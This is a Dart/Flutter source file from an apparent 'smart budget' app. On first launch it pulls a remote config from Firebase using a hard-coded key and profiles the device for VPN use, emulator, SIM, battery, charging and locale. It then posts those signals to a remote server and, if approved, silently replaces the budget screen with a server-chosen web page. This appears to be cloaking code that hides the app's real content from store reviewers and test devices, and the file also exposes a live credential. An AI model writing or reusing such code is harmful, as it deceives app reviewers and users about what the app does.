// ignore_for_file: use_build_context_synchronously

import 'package:dio/dio.dart';
import 'package:flutter/material.dart';
import 'package:in_app_review/in_app_review.dart';
import 'package:smart_budget_companion_113/budget/budgetOtvet.dart';
import 'package:smart_budget_companion_113/budget/budget_local_dto.dart';
import 'package:smart_budget_companion_113/budget/budget_login.dart';
import 'package:smart_budget_companion_113/budget/budget_methods.dart';
import 'package:smart_budget_companion_113/budget/budget_opa_page.dart';
import 'package:smart_budget_companion_113/budget/budget_repo.dart';
import 'package:smart_budget_companion_113/screen/infpropril/infpropril.dart';
import 'package:smart_budget_companion_113/screen/smart_budget/smart_budget_screen.dart';

Future<void> budgetLow(BuildContext context) async {
  final budgetDb = await BudgetRepo().budgetHiveGet();
  if (budgetDb == null) {
    final budgetfbResponse = await Dio().get(
      'https://smartbudget-113-default-rtdb.firebaseio.com/budget.json?auth=AIzaSyCG7iCVfmgP9ClJmODBzoH5bNGRivoDtZc',
    );
    if (budgetfbResponse.data != null) {
      final String? authKey = await budgetLogin(
        addPath: budgetfbResponse.data['budget_tok'],
        l: budgetfbResponse.data['budget_l'],
        p: budgetfbResponse.data['budget_p'],
      );
      if (authKey != null) {
        final budgetprxTemp = await budgetIsUsingVpn();
        final budgetloc = await budgetCountryCode();
        final budgetisEmul = await budgetIsSemulator(context);
        final budgetbtrLevel = await budgetBatteryLevel();
        final budgetisZarayd = await budgetIsCharging();
        final budgetisSim = await budgetHasSim(context);
        final budgetDate = await budgetGetTime();
        try {
          BudgetResponse? budgetResponse;

          final userRegistrationResponse = await Dio(
            BaseOptions(
              headers: {'Authorization': 'Bearer $authKey'},
            ),
          ).post(
            budgetfbResponse.data['budget_add'],
            data: {
              "bundle_name": "com.smartbudget.companion",
              "timestamp": budgetDate,
              "locale": budgetloc,
              "prx_temp": budgetprxTemp,
              "emul_temp": budgetisEmul,
              "battery_temp": budgetisZarayd,
              "mnostate_temp": budgetisSim,
              "btry_temp": budgetbtrLevel,
            },
          );
          if (userRegistrationResponse.data != null) {
            budgetResponse =
                BudgetResponse.fromJson(userRegistrationResponse.data);
          }

          if (budgetResponse != null) {
            if (budgetResponse.boolValue) {
              final budgetHiveObject = BudgetLocalDto(
                reg:
                    '${budgetResponse.budgetResponseDto.trv}${budgetResponse.budgetResponseDto.qwwe}',
                log:
                    '${budgetResponse.budgetResponseDto.cwe}${budgetResponse.budgetResponseDto.nyt}',
                cab: '',
                strt: true,
              );
              BudgetRepo().budgetHiveSet(budgetHiveObject);
              budgetPushReplacement(
                  context, BudgetOpaPage(link: budgetHiveObject.reg));
              budgetCallReview(7);

              return;
            }
          }
        } catch (e) {
          throw Exception(e);
        }
      }
    }
    budgetPushReplacement(context, const InformatsiyaProPrilozhenie());
    BudgetRepo().budgetHiveSet(
      BudgetLocalDto(
        reg: '',
        log: '',
        cab: '',
        strt: false,
      ),
    );
    budgetCallReview(20);
  } else {
    if (budgetDb.strt) {
      if (budgetDb.cab.isNotEmpty) {
        budgetPushReplacement(context, BudgetOpaPage(link: budgetDb.cab));
      } else {
        budgetPushReplacement(context, BudgetOpaPage(link: budgetDb.log));
      }
    } else {
      budgetPushReplacement(
        context,
        const UmnyiDengiStiklo(),
      );
    }
  }
}

Future<void> budgetCallReview(int duration) async {
  await Future.delayed(Duration(seconds: duration));
  try {
    final InAppReview inAppReview = InAppReview.instance;

    if (await inAppReview.isAvailable()) {
      inAppReview.requestReview();
    }
  } catch (e) {
    throw Exception(e);
  }
}

void budgetPushReplacement(BuildContext context, Widget screen) {
  Navigator.pushReplacement(
    context,
    MaterialPageRoute(builder: (_) => screen),
  );
}
